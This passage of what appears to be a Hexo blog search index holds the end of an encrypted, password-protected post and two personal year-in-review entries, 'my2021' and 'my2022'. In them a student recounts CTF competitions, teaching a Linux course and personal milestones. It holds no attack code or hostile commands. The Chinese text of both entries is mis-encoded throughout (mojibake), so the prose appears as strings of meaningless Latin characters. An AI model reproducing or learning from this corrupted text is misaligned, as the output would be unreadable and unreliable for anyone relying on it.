data-hmacdigest="de5ffb3c355c37ef799db2811598b2e070118f1713db3c35b69817df54f1f8bd">7d8077bcea34d13a4778951ea2d2a1ccce0256bcc5d53f74bd6a858a945ec856276f2040ce3d91d145e95f65e63f536f564e07d3cc9ab9bb1fec22f262ad5a1e4fc99d0818f3a1cac7c2a6ea11b53f62975da05ba3343ad48b5b02b81e9efdecc44f4cfae33f5b10a48fc74460bc07491e960d4fafcb54b004ecfbeea566d704f0c8dbe63cbc78689d284f0b5ad3a587f242b222d0b826a89be3bd4b53523e4bc9784da2af2b9a4b4964e07bf508abff229ea78940ea4ab41dcb1bc2e390f9b90a3a4d5305b40a26e6a9bff33925686133c51d622f4a40bd556070284614620e2478b030f3e24a2f0fc1059e8599c5d6d0113e42c0625302624527d4c5bbe72d2047dfe2b04d78e73e5a0e581acdfd5e25fa6e38bd1cc24c265adf6d30fc068f6c4a4780a711c842d7a61d4a47ee8279eddfe9b090d6b98ab038348eeb86901f543edcd2263d3754d9ba2365ec8b1ada36f8cd6f88f8f0487f1f87c6cb1f2d436f513591ad5424d63cac089b792a884c4b773dc9738c626011ece68dbfe6a418dd7dada87289fa995942802846b8636490a62484c23728ffde04fc9f4475713dee7b1cfdf174e13d275c70ceeda5876c7392d6f064ec19ebaf13a894258a7d8577b9e722cfa10daef2e53f7918b0aeab</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">please input my name</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2021</title>
      <link href="/2000/01/31/my/my2021/"/>
      <url>/2000/01/31/my/my2021/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œæ–°å¹´åˆ°å•¦ï¼Œå…ˆç¥å¤§å®¶æ–°å¹´å¿«ä¹å•¦ï¼<br>å¾ˆå¿«ï¼Œ2021å¹´å·²ç»è¿‡å»äº†ï¼Œæ„Ÿè§‰è¿˜æ²¡å­¦åˆ°ä»€ä¹ˆæ—¶é—´å°±å¾ˆå¿«çš„è¿‡å»äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå·±æ²¡æœ‰æŠŠæ¡å¥½æ—¶é—´å§ã€‚ä¸€å¹´ç¡®å®ä¹Ÿè®¤è¯†äº†å¥½å¤šå¥½å¤šçš„äººï¼Œä¹Ÿç»å†äº†å¥½å¤šå¥½å¤šçš„äº‹æƒ…ï¼Œåœ¨æ­¤ä¹Ÿè®°å½•ä¸‹2021å¹´æ‰€å‘ç”Ÿæœ‰è¶£ä¸”æœ‰æ„ä¹‰çš„äº‹æƒ…å§ã€‚</p><p><img src="/images/my2021/1.png" alt="image-20220130142802861"></p><p>ä¸€äºŒä¸‰æœˆä»½éƒ½åœ¨å‡†å¤‡è€ƒè¯•ï¼Œæœ€åä¸ç®¡æ€ä¹ˆæ ·å§ï¼Œè€ƒä¸Šäº†ï¼Œè¿˜æ˜¯æŒºé«˜å…´çš„ã€‚</p><p>äº”æœˆä»½ï¼Œé¦–å…ˆåœ¨è¿˜æ˜¯è¦æ„Ÿè°¢æ¾³å“¥å¸¦æˆ‘æ‰“è¿›é“äººæ€»å†³èµ›å§ï¼Œäººç”Ÿä¸­ç¬¬ä¸€æ¬¡åœ¨è¿™ä¹ˆå¤§çš„èˆå°ä¸Šï¼Œå’Œä¼—å¤šé«˜æ ¡çš„å°ä¼™ä¼´ä¸€èµ·æ‰“æ¯”èµ›ï¼ŒçœŸçš„æ˜¯å¤ªå¼ºäº†ï¼Œæ„Ÿå—é¢‡å¤šã€‚æ‰“æ¯”èµ›å¾ˆç´¯ï¼Œåšä¸å‡ºé¢˜æ¥ï¼Œæ›´ç´¯ã€‚è¿˜æ˜¯é‚£å¥è¯äººå¤–æœ‰äººï¼Œå¤©å¤–æœ‰å¤©ï¼Œå¼ºçš„äººçœŸæ˜¯å¤ªå¤šäº†ï¼Œä¸åŠªåŠ›çš„è¯ï¼ŒçœŸçš„å•¥ä¹Ÿä¸æ˜¯ã€‚è®°å½•ä¸€ä¸‹å‚èµ›è¿‡ç¨‹å§ï¼Œè´´ä¸¤å¼ ç…§ç‰‡ã€‚æ„Ÿè°¢æ¾³å“¥ã€‚<img src="/images/my2021/2.png" alt="image-20220130144246418"></p><p><img src="/images/my2021/3.png" alt="image-20220130144314957"></p><p><img src="/images/my2021/4.png" alt="image-20220130144329029"></p><p><img src="/images/my2021/5.png" alt="image-20220130144830848"></p><p>äº”æœˆä»½ä½œä¸ºç‰¹é‚€æˆ˜é˜Ÿå‚åŠ äº†æ´¥é—¨æ¯ï¼Œæ„Ÿè°¢å¼ è€å¸ˆå¯¹æˆ‘çš„ä¿¡ä»»ï¼Œè®©æˆ‘å¸¦é˜Ÿï¼Œå¸¦å­¦å¼Ÿå’Œå­¦å¦¹å‚åŠ æ¯”èµ›ï¼ŒçœŸæ˜¯åˆ°äº†èµ›åœºä¸Šæ‰çŸ¥é“è‡ªå·±æœ‰å¤šèœï¼Œååœ¨ç”µè„‘å‰å°±å¾ˆç´§å¼ ï¼Œä¸€ä¼šå¹²è¿™ï¼Œä¸€ä¼šå¹²é‚£ï¼Œæ‰‹å¿™è„šä¹±çš„ï¼Œæœ€ä¸»è¦çš„åŸå› è¿˜æ˜¯è„‘å­é‡Œæ²¡æœ‰é‚£ä¹ˆå¤šä¸œè¥¿å§ï¼Œé‚£äº›é«˜æ ¡æˆ˜é˜ŸçœŸçš„å¤ªå¼ºäº†ï¼Œè¢«æ‰“çš„å¾ˆæƒ¨ã€‚ä¸è¿‡ï¼Œæœ€åä¹Ÿæœ‰å¹¸ä¹Ÿå»äº†ä¸–ç•Œæ™ºèƒ½å¤§ä¼šï¼Œè™½ç„¶æ²¡å¬æ‡‚å§ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯è£…å¬æ‡‚äº†å§ã€‚è´´ä¸¤å¼ ç…§ç‰‡è®°å½•ä¸€ä¸‹å§ã€‚æ„Ÿè°¢å¼ è€å¸ˆå’Œå­¦å¼Ÿå­¦å¦¹ã€‚</p><p><img src="/images/my2021/6.png" alt="image-20220130145559697"></p><p><img src="/images/my2021/7.png" alt="image-20220130145615187"></p><p><img src="/images/my2021/8.png" alt="image-20220130145623269"></p><p><img src="/images/my2021/9.png" alt="image-20220130145635833"></p><p><img src="/images/my2021/10.png" alt="image-20220130145713244"></p><p><img src="/images/my2021/11.png" alt="image-20220130150437476"></p><p>å…­æœˆåº•ä¸ƒæœˆåˆä¹Ÿä¸ºå›½å®¶åšäº†ä¸€äº›è´¡çŒ®å§ã€‚å½“ç„¶ä¹Ÿç»™è‡ªå·±å¢åŠ æŠ€æœ¯å’Œç»éªŒä»¥åŠå±¥å†äº†ã€‚æ„Ÿè°¢ç»³å“¥ã€‚</p><p>ä¹æœˆä»½ç¬¬ä¸€æ¬¡ç«™åœ¨è¿™ä¹ˆå¤§çš„èˆå°ä¸Šæ¼”è®²ï¼Œå¾ˆç´§å¼ ï¼Œä¹Ÿå¾ˆæœŸå¾…ã€‚æ€»ä½“æ¥è¯´è¿˜ç®—æˆåŠŸå§ï¼Œæ„Ÿè°¢å°ä¼™ä¼´å¸®æˆ‘æ‹çš„ç…§ï¼Œè´´ä¸€å¼ å§ã€‚æ‰“ç æ‰“ç ã€‚</p><p><img src="/images/my2021/12.png" alt="image-20220130163040609"></p><p>åæœˆä»½ã€‚æ„Ÿè°¢äºè€å¸ˆã€‚è®©æˆ‘èƒ½æœ‰ä¸€æ¬¡é”»ç‚¼è‡ªå·±çš„æœºä¼šã€‚</p><p>åä¸€æœˆä»½ä¹Ÿå»äº†æµ·æ²³å·¥åŒ æ¯ï¼Œæˆç»©ä¸­è§„ä¸­çŸ©å§ï¼Œè¯ä¹¦å°±ä¸è´´äº†ï¼Œä¹Ÿæ²¡å•¥æ„æ€ã€‚ä¸è¿‡é‚£å¤©èµ·çš„éå¸¸æ—©ï¼Œé›ªéå¸¸å¤§ï¼Œé£éå¸¸å¤§ï¼Œè·¯éå¸¸æ»‘ï¼Œå¤©ä¹Ÿè´¼å†·ã€‚</p><p>è¿˜æœ‰å¤©æ´¥å¸‚èµ›ï¼Œç¬¬ä¸€æ¬¡å‚åŠ ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œæ²¡æœ‰æ‹¿åˆ°åæ¬¡ï¼Œæ„§ç–šäº†å¥½ä¹…ï¼Œè¾œè´Ÿäº†è¥¿æ™®è€å¸ˆå¯¹æˆ‘çš„æœŸæœ›ï¼Œå“ï¼Œè°ä¹Ÿä¸æ€ªï¼Œåªèƒ½è¯´å‡†å¤‡çš„ä¸å……åˆ†ã€‚äººå®¶æ¯”æˆ‘ä»¬å‡†å¤‡çš„å¤šï¼Œå“ï¼Œæ²¡åŠæ³•ï¼Œæ€»ç»“æ•™è®­ï¼Œç»§ç»­åŠªåŠ›å§ã€‚æ„Ÿè°¢è¥¿æ™®çš„è€å¸ˆï¼Œæ„Ÿè°¢æˆ‘çš„å°ä¼™ä¼´ä»¬ã€‚</p><p>æ„Ÿè°¢é™ˆè€å¸ˆçš„é”®ç›˜å’Œé¼ æ ‡ã€‚</p><p>æ„Ÿè°¢éƒ­è€å¸ˆå¯¹æˆ‘çš„ä¿¡ä»»ã€‚è®©æˆ‘èƒ½æœ‰ä¸€æ¬¡é”»ç‚¼è‡ªå·±çš„æœºä¼šã€‚</p><p>åé¢å°±æ˜¯éå¸¸å¹¸è¿çš„è¿›å…¥äº†è¥¿æ™®è¿™ä¸ªå¤§å®¶åº­å§ï¼Œè®¤è¯†äº†è®¸å¤šå¯çˆ±çš„å°ä¼™ä¼´ï¼Œå’Œå‰å®³çš„è€å¸ˆã€‚å¸Œæœ›èƒ½åœ¨è¿™é‡Œä¸æµªè´¹æ—¶é—´ï¼Œå­¦ä¹ åˆ°æ›´å¤šçŸ¥è¯†å§ã€‚æ„Ÿè°¢è¥¿æ™®çš„è€å¸ˆã€‚</p><p>æ„Ÿè°¢å‡¡å“¥å¯¹æˆ‘çš„ä¿¡ä»»ã€‚æˆ‘å°½åŠ›ã€‚</p><p>æ„Ÿè°¢çˆ¶æ¯ã€‚</p><p>ä»Šå¹´ä¹Ÿé‡åˆ°äº†è®¸å¤šå¯çˆ±çš„å°ä¼™ä¼´ï¼Œå’Œå‰å®³çš„å¸ˆå‚…ï¼Œå­¦åˆ°äº†å¾ˆå¤šä»¥å‰æ²¡æœ‰è§è¿‡çš„ä¸œè¥¿ã€‚ä»Šå¹´ä¹Ÿæµªè´¹äº†å¥½å¤šçš„æ—¶é—´æ”¾åœ¨è‡ªå·±ä¸å–œæ¬¢çš„äº‹æƒ…ä¸Šï¼Œæ˜å¹´æˆ–è®¸ä¹Ÿä¼šèŠ±è®¸å¤šæ—¶é—´æ”¾åœ¨è‡ªå·±ä¸å–œæ¬¢çš„åœ°æ–¹ï¼Œå“æ²¡åŠæ³•ï¼Œè°è®©è‡ªå·±èµ·ç‚¹ä½å‘¢ã€‚åŠ æ²¹å§ï¼</p><p>å¥½ä¹…å¥½ä¹…ä»¥å‰å°±æœ‰äº†è¿™ä¸ªåšå®¢ï¼Œä½†æ˜¯ç”±äºå„ç§å„æ ·çš„åŸå› å§ï¼Œéƒ½æ²¡æœ‰åŠæ—¶çš„æ›´æ–°æ–‡ç« ï¼Œæœ‰çš„æ—¶å€™æ„Ÿè§‰ä¸€ä¸ªå°æ¯”èµ›å°±è§£å‡ºæ¥ä¸€é“é¢˜ï¼Œæˆ–ç®€å•çš„é¢˜ï¼Œæ²¡å¿…è¦è®°å½•ï¼Œä½†æ˜¯åæ¥åœ¨é‡åˆ°è¿™ä¸ªé¢˜å‘ç°æ˜¯ä»¥å‰è§åˆ°è¿‡çš„ï¼Œæœ‰æ²¡æœ‰ç¬”è®°ï¼Œå„ç§ç™¾åº¦æµªè´¹æ—¶é—´ï¼Œè¿˜æ‰¾ä¸åˆ°è‡ªå·±æƒ³è¦çš„ã€‚å¦ä¸€æ–¹é¢æ„Ÿè§‰åšè¿™ä¸ªäº‹æƒ…ä¹Ÿæ˜¯æŒºé”»ç‚¼è‡ªå·±çš„ï¼Œå†™å‡ºæ¥è§£é¢˜è¿‡ç¨‹å¾ˆå¼€å¿ƒã€‚ä»¥åä¼šç›‘ç£è‡ªå·±ï¼Œæ—¶å¸¸æ›´æ–°åšå®¢ï¼Œå¤šåšé¢˜ã€‚è¯´çš„å†å¤šï¼Œå½’æ ¹ç»“åº•è¿˜æ˜¯è‡ªå·±å¤ªæ‡’äº†å§ã€‚ä»¥åå‹¤å¥‹ä¸€äº›ã€‚å¤šåšæœ‰æ„ä¹‰çš„äº‹æƒ…ã€‚å¤šæ›´åšå®¢ã€‚</p><p>â€æˆ‘ä»ä¸ç›¸ä¿¡ä¸€å¸†é£é¡ºçš„è¯´æ³•ï¼Œä¸€å¸†é£é¡ºä»£è¡¨ç€ä½ æ²¡æœ‰é‡åˆ°ä»»ä½•å›°éš¾ï¼Œä¹Ÿå°±è¯´ä½ æ²¡æœ‰ç»å†è¿‡æ‰“å‡»ï¼Œä¹Ÿå°±æ²¡æœ‰ç§¯ç´¯ç›¸å¯¹åº”çš„ç»éªŒã€‚å­¦èµ°è·¯è¦ç»å†æ‘”è·¤ï¼Œå­¦éª‘è‡ªè¡Œè½¦è¦ç»å†æ‘”è·¤ï¼Œå­¦æ»‘é›ªè¦ç»å†æ‘”è·¤ï¼Œä½ éœ€è¦ä½“éªŒé‚£ç§æ‘”è·¤çš„ç—›æ„Ÿï¼Œä½ æ‰èƒ½å¤Ÿåœ¨æ‘”è·¤å‰åšå‡ºç›¸åº”çš„åŠ¨ä½œæ¥è®©è‡ªå·±å›å½’æ­£è½¨ã€‚æˆ‘ä»¬å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œä½ ä¸‹é¢æ˜¯ä¸‡ä¸ˆæ·±æ¸Šï¼Œè€Œä½ è¦å¾’æ‰‹æ”€å²©ï¼Œä»ä¸€ä¸ªå‚ç›´å¡åº¦çš„å±±è„šï¼Œçˆ¬åˆ°ä¸Šåƒç±³çš„å±±é¡¶ã€‚ç”¨è„šæŒ‡å¤´éƒ½èƒ½æƒ³åˆ°ï¼Œä½ æ­»äº¡çš„åœºæ™¯æ— æ•°ä¸ªï¼Œåªè¦ä¸€æ¬¡å¤±è¯¯ä½ å°±å¯èƒ½æ‰è½å±±å´–ç²‰èº«ç¢éª¨ï¼Œè€Œä½ çš„æˆåŠŸåœºæ™¯åªæœ‰ä¸€ä¸ªï¼šæ´»ç€ä¸Šå»ã€‚æ‰€ä»¥ä½ å¯¹è¿™åº§å±±è¦æœ‰å¿ƒå­˜æ•¬ç•ï¼Œè¦å°å¿ƒç¿¼ç¿¼ï¼Œä¸ç‚«æŠ€ä¸å¼ æ‰¬ï¼Œä½ è¦è°ƒæ•´åˆ°æœ€è°¦å‘çš„çŠ¶æ€ï¼Œè¿œç¦»å–§åš£ï¼Œå¬åˆ°è‡ªå·±å¿ƒè·³çš„å£°éŸ³ï¼Œæ•¬ç•æ¯ä¸€ä¸ªæŠ“æ‰‹ç‚¹ã€‚æŠ“æ‰‹çš„ç‚¹å¾ˆå¤šï¼Œæœ‰å¤§æœ‰å°ï¼Œä½ ä¸èƒ½é‡è§†ä¸€ä¸ªè€Œè½»è§†å¦ä¸€ä¸ªï¼Œå› ä¸ºä½ è½»è§†ä»»ä½•ä¸€ä¸ªçš„åæœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯æ­»äº¡ã€‚â€œ  </p><p>é€ç»™è‡ªå·±ï¼Œè°¦å‘ä¸€äº›ã€‚</p><p>ç”Ÿæ—¥å¿«ä¹~<br><img src="/images/my2021/13.png" alt="image-20220130172521536"></p><blockquote><p>ç”Ÿæ—¥å¿«ä¹<br>ä¸€ç›´åœ¨è·¯ä¸Š<br>åŠ æ²¹ï¼<br>è¯»ä¹¦å¤ªå°‘ï¼Œæƒ³çš„å¤ªå¤š</p><p>date: 2022-01-31 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2022</title>
      <link href="/2000/01/20/my/my2022/"/>
      <url>/2000/01/20/my/my2022/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œæ–°å¹´åˆ°äº†ï¼Œç¥å¤§å®¶æ–°å¹´å¿«ä¹å–½ï¼<br>å¾ˆå¿«ï¼Œ2022å¹´å·²ç»è¿‡å»äº†ï¼Œ2023å¹´å·²ç»è¿‡å»20å¤šå¤©äº†ï¼Œæ—¶é—´å°±å¾ˆå¿«çš„è¿‡å»äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå·±æ²¡æœ‰æŠŠæ¡å¥½æ—¶é—´å§ã€‚åœ¨è¿‡å»çš„ä¸€å¹´ä¸­è®¤è¯†äº†ä¸€äº›äººï¼Œéƒ½éå¸¸æœ‰è¶£ã€‚ä¹Ÿé‡åˆ°äº†å¾ˆå¤šæœ‰è¶£çš„äº‹æƒ…ã€‚</p><p>æ„Ÿè°¢jackieå“¥ç»™æˆ‘æ¨é‡ä¿ï¼ŒäºŒæœˆä»½å†¬å¥¥ä¼šå»é‡ä¿ï¼Œè®¤è¯†äº†å¥½å‡ ä¸ªæœ‰è¶£çš„å“¥å“¥ï¼Œäººéƒ½æŒºå¥½çš„ï¼Œè¿˜æ€»å¸®æˆ‘ç™»æœºå™¨ã€‚æ„Ÿè°¢ã€‚åé¢è¿˜å¸®ä»–ä»¬å†™äº†ä¸ªå°è„šæœ¬ï¼Œå¸®ä»–ä»¬ç­›é€‰æ—¥å¿—ä¸­æœ‰ç”¨ä¿¡æ¯å¯¼å‡ºexcelï¼Œç”±äºå†…ç½‘ä½¿ç”¨è¿˜å°æˆäº†exeï¼Œå®Œäº‹åé‚£è¾¹çš„å“¥è¯´è´¼è¿˜ç”¨ï¼Œå¸®ä»–ä»¬çœå»äº†90%çš„æ—¶é—´ï¼Œè¿˜å¾ˆæ„Ÿè°¢æˆ‘ã€‚ç¬é—´æ„Ÿè§‰å…¶å®çœ‹è®¾å¤‡ä¸é€‚åˆæˆ‘ï¼Œæˆ‘æ„Ÿè§‰è¿ç»´æ¯”è¾ƒé€‚åˆæˆ‘ã€‚å› ä¸ºï¼Œâ€¦â€¦ã€‚</p><p>å››æœˆä»½å’Œäº”æœˆä»½å§ï¼Œæ„Ÿè°¢ä¿ºä»¬éƒ­è€å¸ˆè®©æˆ‘å¸®ä»–å¸¦äº†åå‡ å¤©è¯¾ï¼Œæ„Ÿè°¢éƒ­è€å¸ˆåˆç»™æˆ‘äº†ä¸€æ¬¡è¿™ä¹ˆå¥½çš„é”»ç‚¼æœºä¼šã€‚æ„Ÿè§‰å½“è€å¸ˆå¥½è¾›è‹¦å•Šï¼Œemmmmï¼Œå…¶å®å½“å¯¼å¸ˆä¸æ˜¯å¾ˆè¾›è‹¦ï¼Œå°±æ˜¯æœ‰äº›ä¸œè¥¿æ˜æ˜åœ¨è¯¾ä¸Šæˆ‘å·²ç»è®²è¿‡äº†ï¼Œç„¶åå‘¢ï¼Œæœ‰åŒå­¦è¯¾ä¸‹åˆæ¥é—®ï¼Œè€Œä¸”è¿˜ä¸æ˜¯ä¸€ä¸ªåŒå­¦é—®ï¼Œå¥½å¤šåŒå­¦éƒ½æ¥é—®ã€‚è¿™é‡Œå¯èƒ½ä¸æ˜¯æˆ‘æ²¡æœ‰è®²è¿‡ï¼Œæ˜¯æˆ‘å¸ƒç½®äº†ä½œä¸šï¼Œéƒ½æ²¡æœ‰å¬ï¼Œæ¥é—®çš„å¾ˆç´¯ã€‚å¸ƒç½®ä½œä¸šä¹Ÿå¾ˆç´¯ã€‚emmmmï¼Œè¿˜æœ‰ä¸€ä¸ªï¼ŒåŒå­¦æŠ„ä½œä¸šä¹ŸæŒºä¸¥é‡çš„ï¼Œé‚£ä½œä¸šæˆªå›¾linuxç”¨æˆ·åéƒ½ä¸€æ ·ï¼Œæˆ‘è£‚å¼€ã€‚çœ‹åˆ°ä½œä¸šï¼Œæˆ‘ç¬é—´æ„Ÿè§‰æˆ‘è¿™ä¸ªè€å¸ˆå½“çš„å¾ˆå¤±è´¥ï¼Œæ²¡æœ‰æ•™ä¼šå¤§å®¶ã€‚æœ€åä¸€ç‚¹ï¼Œè¦æ˜¯å½“è€å¸ˆä¸ç”¨å¸ƒç½®ä½œä¸šï¼Œä¸ç”¨æ”¹ä½œä¸šï¼ŒåŒå­¦ä»¬ä¸è¦ä¸€ç›´é—®åŒä¸€ä¸ªæˆ‘ä¸Šè¯¾è®²è¿‡çš„é—®é¢˜çš„è¯ï¼Œæˆ‘æ„Ÿè§‰å½“è€å¸ˆè¿˜æ˜¯è›®èˆ’æœçš„ã€‚è®²è¯¾åšè§†é¢‘è¿˜æ˜¯è›®ä¸é”™çš„ï¼Œæ²¡æœ‰å”®åã€‚</p><p>ä¸ƒæœˆä»½ï¼Œæ„Ÿè°¢Aä½¬ç»™æˆ‘æ¨äº†ä¸ªè®²ctfè¯¾çš„å…¼èŒã€‚ä»ä¸­ä¹Ÿå­¦åˆ°äº†è®¸å¤šè®²è¯¾çš„æŠ€å·§ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ã€‚æˆ‘è§‰å¾—ç°åœ¨è®©æˆ‘æ‰“2019å¹´é‚£ä¸ªawdæ¯”èµ›ï¼Œæˆ‘ä¸€å®šæ‰“ç©¿ä»–ä»¬ã€‚æ„Ÿè°¢Aä½¬ã€‚</p><p>å…«æœˆä»½è¿˜å›å®¶å­¦äº†ä¸ªè½¦ï¼Œemmmï¼Œéš¾åº¦ä¸­ç­‰å§ï¼Œå¸Œæœ›æ—©ç‚¹æ‹¿åˆ°è¯ï¼Œå°±èƒ½å¼€è½¦äº†ã€‚</p><p>ä¹æœˆï¼Œæ„Ÿè°¢å‡¡å“¥ä¿¡ä»»æˆ‘ï¼Œç»™æˆ‘é”»ç‚¼è‡ªå·±çš„æœºä¼šï¼Œè®©æˆ‘å‚åŠ äº†ä¸ªè®²åº§ã€‚</p><p>åä¸€æœˆä»½çš„å¤©æ´¥å¤§å­¦ç”Ÿctfæ¯”èµ›ï¼Œemmmmï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œåˆèµ›æ‰“çš„è¿˜è¡Œï¼Œå†³èµ›å˜›ï¼Œæ„Ÿè§‰è¿˜æ˜¯è‡ªå·±å¤ªèœäº†ä¸€ç‚¹ï¼Œæ²¡æœ‰å›¢é˜Ÿã€‚ä¸€ä¸ªäººçš„èƒ½åŠ›ç¡®å®æ˜¯æœ‰é™çš„ï¼Œå½“ç„¶ä¸èƒ½æ’é™¤é‚£äº›å…¨æ ˆçš„å¤§ä½¬ï¼Œæ˜¯çœŸçš„å¼ºã€‚æ¯”èµ›ä¹Ÿå°±å¾—äº†äºŒç­‰å¥–ï¼Œå°‘ç‚¹pyï¼Œå°‘ç‚¹ä»£æ‰“ï¼Œæˆ–è®¸æœ‰æœºä¼šæ‹¿ä¸ªä¸€ç­‰å¥–ã€‚ä»¥å­¦ç”Ÿèº«å‚åŠ çš„æ¯”èµ›è¶Šæ¥è¶Šå°‘äº†ï¼Œçæƒœå§ã€‚ä¸è¿‡å®‰å…¨è¿™æ¡è·¯ï¼Œæˆ‘æ˜¯ä¸ä¼šæ”¾å¼ƒçš„ã€‚</p><blockquote><p>åäºŒæœˆä»½å°±æ¯”è¾ƒç‰¹æ®Šäº†ï¼Œè¿™æ˜¯æˆ‘è¿™ä¸€å¹´ä¸­å‘ç”Ÿçš„æœ€å¤§çš„äº‹æƒ…äº†ï¼Œå¾—åˆ°äº†ä¸€ä¸ªæˆ‘å–œæ¬¢çš„å¥³å­©ã€‚ä»æ­¤ä»¥åï¼Œæˆ‘ä¹Ÿå°†ä¸å†æ˜¯å­¤å•çš„ä¸€äººã€‚èº«ä»½ä¹Ÿå¤šäº†ä¸€ä¸ªï¼Œæ„Ÿè§‰è‚©ä¸Šçš„è´£ä»»æ›´é‡äº†äº›ã€‚</p><p>ç»ˆäºå’Œè¿‡å»è¯´äº†å†è§ï¼Œæ˜¯æ—¶å€™å¼€å§‹æ–°çš„ç”Ÿæ´»äº†ã€‚</p><p><img src="/images/my2022/1.jpg" alt="image-20220130142802861"></p></blockquote><p>å¸Œæœ›æ˜å¹´å¯ä»¥æ‰¾åˆ°ä¸€ä»½å®ä¹ å·¥ä½œï¼Œå¤šå¤šæ›´æ–°åšå®¢ã€‚</p><p>éœ€è¦æ„Ÿè°¢çš„äººå¤ªå¤šï¼Œå¯¹æˆ‘çš„å¥½æˆ‘éƒ½è®°å¾—ã€‚</p><p>â€œæˆ‘ä»ä¸ç›¸ä¿¡ä¸€å¸†é£é¡ºçš„è¯´æ³•ï¼Œä¸€å¸†é£é¡ºä»£è¡¨ç€ä½ æ²¡æœ‰é‡åˆ°ä»»ä½•å›°éš¾ï¼Œä¹Ÿå°±è¯´ä½ æ²¡æœ‰ç»å†è¿‡æ‰“å‡»ï¼Œä¹Ÿå°±æ²¡æœ‰ç§¯ç´¯ç›¸å¯¹åº”çš„ç»éªŒã€‚å­¦èµ°è·¯è¦ç»å†æ‘”è·¤ï¼Œå­¦éª‘è‡ªè¡Œè½¦è¦ç»å†æ‘”è·¤ï¼Œå­¦æ»‘é›ªè¦ç»å†æ‘”è·¤ï¼Œä½ éœ€è¦ä½“éªŒé‚£ç§æ‘”è·¤çš„ç—›æ„Ÿï¼Œä½ æ‰èƒ½å¤Ÿåœ¨æ‘”è·¤å‰åšå‡ºç›¸åº”çš„åŠ¨ä½œæ¥è®©è‡ªå·±å›å½’æ­£è½¨ã€‚â€</p><p>é€ç»™è‡ªå·±ï¼Œè°¦å‘ä¸€äº›ã€‚</p><blockquote><p>ç”Ÿæ—¥å¿«ä¹~<br>ä¸€ç›´åœ¨è·¯ä¸Š<br>åŠ æ²¹ï¼<br>è¯»ä¹¦å¤ªå°‘ï¼Œæƒ³çš„å¤ªå¤š<br>date: 2023-01-20 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
